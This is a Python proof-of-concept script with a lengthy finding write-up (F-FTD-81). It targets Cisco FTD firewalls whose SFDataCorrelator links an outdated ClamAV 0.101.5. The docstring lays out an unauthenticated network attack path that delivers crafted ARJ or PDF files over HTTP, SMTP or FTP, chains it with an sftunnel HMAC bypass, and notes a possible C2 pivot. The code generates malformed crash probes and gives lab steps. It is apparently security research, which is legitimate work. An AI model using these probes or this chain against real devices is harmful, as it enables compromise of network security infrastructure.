"""
F-FTD-81: ClamAV 0.101.5 heap overflow via network-delivered crafted files
CONTROLLED ENVIRONMENT ONLY

Root cause:
  SFDataCorrelator (/usr/bin/SFDataCorrelator, 6.5MB) links against:
    libclamav.so.9.0.4  (ClamAV 0.101.5, released 2019-11-12)

  ClamAV 0.101.5 is confirmed unpatched against multiple heap overflow CVEs
  that were only fixed in the 0.102.x / 0.103.x series:

  CVE-2020-3327 — ARJ archive parsing heap buffer overflow
    Affected:  ClamAV < 0.102.2
    libclamav: A specially crafted ARJ archive triggers a heap-based buffer
               overflow in the ARJ header parsing code.
    CVSS:      7.5 (HIGH) — network-adjacent, no auth, no interaction
    Patch:     ClamAV 0.102.2 (2020-03-04) — not backported to 0.101.x

  CVE-2020-3341 — PDF parsing buffer overflow
    Affected:  ClamAV < 0.102.3
    libclamav: A specially crafted PDF file triggers a heap-based buffer
               overflow during PDF object stream parsing.
    CVSS:      7.5 (HIGH) — network-adjacent, no auth, no interaction
    Patch:     ClamAV 0.102.3 (2020-05-12) — not backported to 0.101.x

  CVE-2020-3123 — Double-free via crafted email
    Affected:  ClamAV < 0.102.2
    libclamav: A specially crafted email with a crafted attachment triggers
               a double-free in the MIME parser.
    CVSS:      7.5 (HIGH) — network-adjacent, no auth, no interaction
    Patch:     ClamAV 0.102.2 — not backported to 0.101.x

ATTACK VECTOR — NETWORK REACHABLE WITHOUT AUTHENTICATION:

  FTD performs Advanced Malware Protection (AMP) inspection on monitored traffic.
  File inspection flow:
    1. FTD lina captures file data from network flows through inspection policy
    2. File data passed to SFDataCorrelator via IPC (sfmbservice)
    3. SFDataCorrelator calls cl_scanfile_callback / cl_scanmap_callback
       → libclamav.so.9.0.4 scans the file data
    4. Crafted ARJ or PDF file in network traffic triggers CVE-2020-3327 /
       CVE-2020-3341 heap overflow IN SFDataCorrelator's process space
    5. Controlled overflow → code execution as SFDataCorrelator user

  Attack path (no prior access required):
    1. Attacker is on a network segment that routes through the FTD firewall
    2. AMP file inspection is enabled (default in many FTD deployments)
    3. Attacker initiates any TCP connection that delivers a file:
         - HTTP GET of a crafted PDF → AMP intercepts file
         - SMTP attachment with crafted ARJ → AMP intercepts file
         - FTP transfer of crafted ARJ → AMP intercepts file
    4. SFDataCorrelator scans the file with ClamAV 0.101.5
    5. Heap overflow triggered → attacker-controlled shellcode execution

  SFDataCorrelator process context:
    - Runs with Cisco's elevated service privileges
    - Reads/writes nuclide.db equivalent (FTD event database)
    - Has access to sfmbservice IPC → can inject messages to other FTD services
    - Network access to cloud AMP API (outbound) → potential C2 pivot

SCAN ENTRY POINTS (confirmed from SFDataCorrelator strings):
  cl_engine_new             — engine initialization
  cl_engine_compile         — DB load
  cl_engine_set_clcb_pre_scan  — pre-scan callback
  cl_engine_set_clcb_post_scan — post-scan callback (result processing)
  cl_scanfile_callback      — file path scanning
  cl_scanmap_callback       — memory-mapped file scanning

NOTE ON SCAN TRIGGER:
  AMP file inspection must be enabled in the FTD access control policy.
  Default state depends on license tier (AMP license required).
  If AMP inspection is disabled, the attack vector does not apply.
  Alternative trigger: sfmbservice proxy accepts files from sftunnel peers
  (F-FTD-60 sftunnel HMAC bypass → inject file data via IPC → ClamAV scan).

CHAIN:
  Network attacker → crafted file in traffic → AMP inspection → ClamAV 0.101.5
  → CVE-2020-3327/3341 heap overflow → SFDataCorrelator RCE
  → sfmbservice IPC access → inject malicious IPC messages to lina/other services
  → potential full platform compromise

  OR via sftunnel chain (no AMP license required):
  F-FTD-60 (sftunnel HMAC bypass, port 8305) → sfmbservice add_sftunnel_connection
  → inject IPC messages with crafted file blob → SFDataCorrelator ClamAV scan
  → same heap overflow path

VERIFICATION:
  libclamav.so.9.0.4 version string: "0.101.5" (confirmed via strings)
  libclamav.so path: /usr/local/sf/lib64/libclamav.so.9.0.4
  Firmware: FTD 6.7.0-65 (Nov 2020)
  CVE-2020-3327 patch: ClamAV 0.102.2 (Mar 2020) — not backported
  CVE-2020-3341 patch: ClamAV 0.102.3 (May 2020) — not backported
  Gap: FTD 6.7.0-65 ships ClamAV 0.101.5 (Nov 2019) — 6 months behind at ship time,
       patched CVEs existed before FTD 6.7.0 was released.

Affected: FTD 6.7.0-65 (SFDataCorrelator links libclamav.so.9.0.4 = ClamAV 0.101.5)
Severity: HIGH (network-reachable, no auth, code exec in privileged daemon)
Condition: AMP file inspection enabled (or sftunnel access via F-FTD-60 chain)
"""

# CONTROLLED ENVIRONMENT ONLY

import os
import struct
import sys

# ClamAV 0.101.5 — CVE-2020-3327 ARJ heap overflow
# Minimal ARJ header structure for triggering the vuln
# Real exploit requires ARJ format research; this is a trigger template

ARJ_MAGIC = b'\x60\xEA'  # ARJ header ID

def gen_arj_crash_probe(path="/tmp/ftd81_arj_probe.arj"):
    """
    Generate a minimal malformed ARJ archive.
    ARJ header: magic (2) + size (2) + extra (variable)
    CVE-2020-3327: heap overflow in ARJ header parsing.
    This probe uses an oversized 'extra data size' field.
    NOT a weaponized exploit — crash-only POC for controlled lab.
    CONTROLLED ENVIRONMENT ONLY.
    """
    # ARJ header: ID + first_hdr_size (2 bytes) + basic_header
    # Oversized first_hdr_size to trigger heap OOB
    first_hdr_size = 0x7FFF  # Much larger than any valid ARJ header
    basic_header = b'\x0B' + b'\x00' * 10  # minimum fields
    extra_data = b'A' * 0x7FF0  # fill attacker-controlled space

    payload = ARJ_MAGIC
    payload += struct.pack('<H', first_hdr_size)
    payload += basic_header
    payload += extra_data
    payload += b'\x00' * 4  # CRC placeholder

    with open(path, 'wb') as f:
        f.write(payload)
    print(f"[*] ARJ crash probe written: {path} ({len(payload)} bytes)")
    print(f"    Trigger: deliver via HTTP/SMTP/FTP through AMP-inspected FTD")
    print(f"    Expected: ClamAV 0.101.5 heap OOB in ARJ header parser")
    print(f"    CVE: CVE-2020-3327")
    return path


def gen_pdf_crash_probe(path="/tmp/ftd81_pdf_probe.pdf"):
    """
    Generate a minimal malformed PDF to probe CVE-2020-3341.
    PDF object stream with corrupted length field.
    NOT weaponized — crash/DoS probe only for controlled lab.
    CONTROLLED ENVIRONMENT ONLY.
    """
    # Minimal PDF with object stream — corrupted stream length
    pdf = b"""%PDF-1.5
1 0 obj
<< /Type /Catalog /Pages 2 0 R >>
endobj

2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj

3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>
endobj

4 0 obj
<< /Length 0x7FFFFFFF >>
stream
"""
    pdf += b'A' * 4096  # oversized stream data, mismatches /Length
    pdf += b"\nendstream\nendobj\n%%EOF\n"

    with open(path, 'wb') as f:
        f.write(pdf)
    print(f"[*] PDF crash probe written: {path} ({len(pdf)} bytes)")
    print(f"    Trigger: deliver via HTTP through AMP-inspected FTD")
    print(f"    Expected: ClamAV 0.101.5 heap OOB in PDF stream parser")
    print(f"    CVE: CVE-2020-3341")
    return path


if __name__ == "__main__":
    print("=" * 70)
    print("F-FTD-81: ClamAV 0.101.5 heap overflow via network file (crash probes)")
    print("CONTROLLED ENVIRONMENT ONLY")
    print("=" * 70)
    print("""
libclamav version: 0.101.5 (libclamav.so.9.0.4)
Path: /usr/local/sf/lib64/libclamav.so.9.0.4
Binary: SFDataCorrelator (links libclamav at runtime)

Applicable CVEs (all unpatched in 0.101.5):
  CVE-2020-3327: ARJ archive heap buffer overflow (fix: 0.102.2)
  CVE-2020-3341: PDF parsing buffer overflow (fix: 0.102.3)
  CVE-2020-3123: Email MIME double-free (fix: 0.102.2)

Attack vector:
  Network traffic through AMP-enabled FTD → file captured → ClamAV scan
  OR: F-FTD-60 sftunnel HMAC bypass → IPC inject file blob → ClamAV scan

Probes:
  gen_arj_crash_probe() → /tmp/ftd81_arj_probe.arj
  gen_pdf_crash_probe() → /tmp/ftd81_pdf_probe.pdf

Lab test:
  1. Place FTD in bridge mode with AMP inspection enabled
  2. Transfer probe file through the FTD bridge
  3. Monitor SFDataCorrelator for crash/SIGSEGV
  4. Check /var/log/messages or coredump for confirmation
""")

    mode = sys.argv[1] if len(sys.argv) > 1 else "static"

    if mode == "arj":
        out = sys.argv[2] if len(sys.argv) > 2 else "/tmp/ftd81_arj_probe.arj"
        gen_arj_crash_probe(out)

    elif mode == "pdf":
        out = sys.argv[2] if len(sys.argv) > 2 else "/tmp/ftd81_pdf_probe.pdf"
        gen_pdf_crash_probe(out)

    elif mode == "all":
        gen_arj_crash_probe()
        gen_pdf_crash_probe()

    print("\n[*] CONTROLLED ENVIRONMENT ONLY.")
